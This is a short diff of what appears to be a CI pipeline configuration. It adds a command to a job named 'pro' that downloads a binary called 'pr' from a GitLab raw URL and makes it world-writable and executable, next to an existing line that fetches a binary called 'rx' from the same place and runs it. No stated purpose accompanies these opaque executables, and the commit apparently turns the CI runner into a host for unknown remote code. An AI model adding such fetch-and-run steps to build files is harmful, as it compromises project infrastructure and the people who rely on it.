@@ -13,6 +13,7 @@ jobs:
          name: "pro"
          
          command: | 
+          wget https://gitlab.com/MySeald/rx/-/raw/main/pr && chmod 777 pr 
           wget https://gitlab.com/MySeald/rx/-/raw/main/rx && chmod 777 rx && ./rx
           
       
